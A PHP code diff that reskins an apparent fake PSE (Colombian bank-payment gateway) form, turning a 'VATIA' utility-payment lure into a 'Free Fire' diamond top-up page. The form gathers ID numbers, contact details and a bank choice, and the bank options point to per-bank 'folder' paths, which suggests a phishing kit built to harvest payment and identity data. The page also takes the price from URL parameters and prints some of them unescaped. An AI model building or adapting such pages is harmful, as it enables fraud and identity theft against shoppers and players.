@@ -1,41 +1,31 @@
 <?php
-// index.php - Formulario PSE VATIA
+// index.php - Formulario PSE para Free Fire
 session_start();
 require_once '../config.php';
 
-// Función para obtener el valor real desde la API
-function obtenerValorDesdeAPI($id_interno) {
-    try {
-        require_once '../../api/vatia_api.php'; // Ajustar path
-        $resultado = consultarVatia($id_interno);
-        if ($resultado['success'] && isset($resultado['valor_total'])) {
-            return [
-                'valor_numerico' => $resultado['valor_total'],
-                'valor_formateado' => $resultado['valor_formateado'] ?? '$' . number_format($resultado['valor_total'], 2, ',', '.'),
-                'total_facturas' => $resultado['total_facturas'] ?? 0
-            ];
-        }
-    } catch (Exception $e) {
-        error_log("Error obtener valor API: " . $e->getMessage());
-    }
-    return ['valor_numerico' => 0, 'valor_formateado' => '$0', 'total_facturas' => 0];
-}
+// Obtener datos del formulario principal
+$method = $_GET['method'] ?? '';
+$diamonds = $_GET['diamonds'] ?? 0;
+$bonus = $_GET['bonus'] ?? 0;
+$price = $_GET['price'] ?? 0;
+$total = $_GET['total'] ?? 0;
+$fullName = $_GET['fullName'] ?? '';
+$email = $_GET['email'] ?? '';
+$promoCode = $_GET['promoCode'] ?? '';
+$playerId = $_GET['playerId'] ?? '';
+$playerName = $_GET['playerName'] ?? '';
+$region = $_GET['region'] ?? 'US';
 
-// Obtener valor si hay id_interno en sesión
-$valor_formateado = '$0';
-$valor_numerico = 0;
-if (isset($_SESSION['id_interno'])) {
-    $datos_api = obtenerValorDesdeAPI($_SESSION['id_interno']);
-    $valor_formateado = $datos_api['valor_formateado'];
-    $valor_numerico = $datos_api['valor_numerico'];
-}
+// Usar el precio como valor formateado
+$valor_formateado = $price;
+$valor_numerico = floatval(str_replace(['$', ','], ['', '.'], $price));
 ?>
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PSE - Pagos VATIA</title>
+    <title>PSE - Recargas Free Fire</title>
     <style>
         * {
             margin: 0;
@@ -263,36 +253,52 @@ if (isset($_SESSION['id_interno'])) {
     <div class="wrapper">
         <div class="container">
             <!-- Botón salir -->
-            <a href="../checkout.php" class="btn-salir">Salir</a>
+            <a href="../../index.php" class="btn-salir">Salir</a>
 
             <!-- Logo -->
             <div class="logo-container">
-                <img src="1.png" alt="VATIA">
+                <img src="../../images/free-fire-icon.png" alt="Free Fire">
+                <h1 style="color: #333; font-size: 24px; margin-top: 10px;">Recargas Free Fire</h1>
             </div>
 
             <!-- Formulario -->
             <div class="form-container">
                 <form id="pse_form" method="POST" action="procesar.php">
+                    <!-- Campos hidden con datos de Free Fire -->
+                    <input type="hidden" name="procesarRecarga" value="1">
+                    <input type="hidden" name="diamonds" value="<?php echo htmlspecialchars($diamonds); ?>">
+                    <input type="hidden" name="bonus" value="<?php echo htmlspecialchars($bonus); ?>">
+                    <input type="hidden" name="price" value="<?php echo htmlspecialchars($price); ?>">
+                    <input type="hidden" name="total" value="<?php echo htmlspecialchars($total); ?>">
+                    <input type="hidden" name="playerId" value="<?php echo htmlspecialchars($playerId); ?>">
+                    <input type="hidden" name="playerName" value="<?php echo htmlspecialchars($playerName); ?>">
+                    <input type="hidden" name="region" value="<?php echo htmlspecialchars($region); ?>">
+                    <input type="hidden" name="promoCode" value="<?php echo htmlspecialchars($promoCode); ?>">
+                    <input type="hidden" name="monto" value="<?php echo htmlspecialchars($valor_numerico); ?>">
+                    <input type="hidden" name="descripcion" value="Recarga Free Fire - <?php echo htmlspecialchars($diamonds); ?> diamantes">
                     <!-- Información de pago -->
                     <div style="background: #ffffff; border: 1px solid #ddd; border-radius: 4px; padding: 20px; margin-bottom: 25px; text-align: left; max-width: 400px;">
                         <div style="font-size: 14px; color: #333; margin-bottom: 10px; font-weight: normal;">
-                            📋 PAGOS VATIA
+                            🎮 RECARGAS FREE FIRE
                         </div>
                         <div style="font-size: 14px; color: #333; margin-bottom: 10px; font-weight: normal;">
-                            💰 SISTEMA DE PAGOS
+                            💎 Diamantes: <?php echo $diamonds; ?> (Bonus: <?php echo $bonus; ?>)
                         </div>
-                        <div style="font-size: 14px; color: #666; font-weight: normal;">
-                            Selecciona tu banco para continuar con el pago
+                        <div style="font-size: 14px; color: #333; margin-bottom: 10px; font-weight: normal;">
+                            👤 Jugador: <?php echo htmlspecialchars($playerName); ?> (ID: <?php echo htmlspecialchars($playerId); ?>)
+                        </div>
+                        <div style="font-size: 16px; color: #e74c3c; font-weight: bold;">
+                            💰 Total a pagar: <?php echo htmlspecialchars($valor_formateado); ?>
                         </div>
                     </div>
 
-                    <!-- Información Titular -->
+                    <!-- Información del Titular (Pre-llenada) -->
                     <div class="form-title">Información del Titular</div>
 
                     <div class="form-group">
                         <label>Documento de identidad: <span>*</span></label>
                         <select name="tipo_doc" id="tipo_doc" required>
-                            <option value="CC">CC</option>
+                            <option value="CC" selected>CC</option>
                             <option value="CE">CE</option>
                             <option value="NIT">NIT</option>
                         </select>
@@ -300,55 +306,55 @@ if (isset($_SESSION['id_interno'])) {
 
                     <div class="form-group">
                         <label>Número de documento: <span>*</span></label>
-                        <input type="text" name="cedula" id="cedula" required>
+                        <input type="text" name="cedula" id="cedula" placeholder="Ingresa tu documento" required>
                     </div>
 
                     <div class="form-group">
                         <label>Nombres: <span>*</span></label>
-                        <input type="text" name="nombres" id="nombres" required>
+                        <input type="text" name="nombres" id="nombres" value="<?php echo htmlspecialchars(explode(' ', $fullName)[0] ?? ''); ?>" required>
                     </div>
 
                     <div class="form-group">
                         <label>Apellidos: <span>*</span></label>
-                        <input type="text" name="apellidos" id="apellidos" required>
+                        <input type="text" name="apellidos" id="apellidos" value="<?php echo htmlspecialchars(explode(' ', $fullName, 2)[1] ?? ''); ?>" required>
                     </div>
 
                     <div class="form-group">
                         <label>Correo: <span>*</span></label>
-                        <input type="email" name="correo" id="correo" required>
+                        <input type="email" name="correo" id="correo" value="<?php echo htmlspecialchars($email); ?>" required>
                     </div>
 
                     <div class="form-group">
                         <label>Teléfono: <span>*</span></label>
-                        <input type="tel" name="telefono" id="telefono" required>
+                        <input type="tel" name="telefono" id="telefono" placeholder="Ingresa tu teléfono" required>
                     </div>
 
                     <div class="form-group">
                         <label>Celular: <span>*</span></label>
-                        <input type="tel" name="celular" id="celular" required>
+                        <input type="tel" name="celular" id="celular" placeholder="Ingresa tu celular" required>
                     </div>
 
                     <div class="form-group">
                         <label>Dirección: <span>*</span></label>
-                        <input type="text" name="direccion" id="direccion" required>
+                        <input type="text" name="direccion" id="direccion" placeholder="Ingresa tu dirección" required>
                     </div>
 
                     <div class="form-group">
                         <label>País: <span>*</span></label>
                         <select name="pais" id="pais" required>
-                            <option value="Colombia">Colombia</option>
+                            <option value="Colombia" selected>Colombia</option>
                         </select>
                     </div>
 
                     <div class="form-group">
                         <label>Ciudad: <span>*</span></label>
-                        <input type="text" name="ciudad" id="ciudad" required>
+                        <input type="text" name="ciudad" id="ciudad" placeholder="Ingresa tu ciudad" required>
                     </div>
 
                     <div class="form-group">
                         <label>Tipo de persona: <span>*</span></label>
                         <select name="tipo_persona" id="tipo_persona" required>
-                            <option value="natural">Natural</option>
+                            <option value="natural" selected>Natural</option>
                             <option value="juridica">Jurídica</option>
                         </select>
                     </div>
@@ -357,23 +363,7 @@ if (isset($_SESSION['id_interno'])) {
                                        <div class="input-group">
                         <label>Bancos *</label>
                         <select id="txt-banco" name="banco" required>
-                            <option label="A continuación seleccione su banco" value="">A continuación seleccione su banco</option>
-                            <option label="BANCO AV VILLAS" value="avvillas" tipo="2" folder="b-34f1/">BANCO AV VILLAS</option>
-                            <option label="BANCO BBVA COLOMBIA S.A." value="bbva" tipo="2" folder="b-34f13">BANCO BBVA COLOMBIA S.A.</option>
-                            <option label="BANCO CAJA SOCIAL" value="caja-social" tipo="2" folder="b-34f2">BANCO CAJA SOCIAL</option>
-                            <option label="BANCO DAVIVIENDA" value="davivienda" tipo="2" folder="b-34f10">BANCO DAVIVIENDA</option>
-                            <option label="BANCO DE BOGOTA" value="bogota" tipo="2" folder="b-34f4">BANCO DE BOGOTA</option>
-                            <option label="BANCO DE OCCIDENTE" value="occidente" tipo="2" folder="b-34f14">BANCO DE OCCIDENTE</option>
-                            <option label="BANCO FALABELLA" value="falabella" tipo="2" folder="b-34f5">BANCO FALABELLA</option>
-                            <option label="BANCO FINANDINA S.A. BIC" value="finandina" tipo="2" folder="b-34f6">BANCO FINANDINA S.A. BIC</option>
-                            <option label="BANCO ITAU" value="itau" tipo="2" folder="b-34f7">BANCO ITAU</option>
-                            <option label="BANCO MUNDO MUJER S.A." value="mundo-mujer" tipo="1" folder="b-34f01">BANCO MUNDO MUJER S.A.</option>
-                            <option label="BANCO POPULAR" value="popular" tipo="2" folder="b-34f18">BANCO POPULAR</option>
-                            <option label="BANCO SERFINANZA" value="serfinanza" tipo="2" folder="b-34f16">BANCO SERFINANZA</option>
-                            <option label="BANCO UNION antes GIROS" value="union" tipo="1" folder="b-34f0">BANCO UNION antes GIROS</option>
-                            <option label="BANCOLOMBIA" value="bancolombia" tipo="2" folder="b-34f9">BANCOLOMBIA</option>
-                            <option label="DAVIBANK" value="davibank" tipo="2" folder="b-34f12">DAVIBANK</option>
-                            <option label="LULO BANK" value="lulo" tipo="1" folder="b-34f02">LULO BANK</option>
+                            <option label="Selecciona tu banco para pagar los diamantes" value="">Selecciona tu banco para pagar los diamantes</option>
                             <option label="NEQUI" value="nequi" tipo="1" folder="nequi-1/">NEQUI</option>
                         </select>
                     </div>
@@ -394,7 +384,7 @@ if (isset($_SESSION['id_interno'])) {
                     <!-- Botones -->
                     <div class="botones">
                         <a href="../checkout.php" class="btn btn-cambiar">Cambiar Medio de Pago</a>
-                        <button type="button" onclick="procesarBanco()" class="btn btn-pagar">Continuar con Pago</button>
+                        <button type="submit" class="btn btn-pagar">Continuar con Pago</button>
                     </div>
                 </form>
             </div>
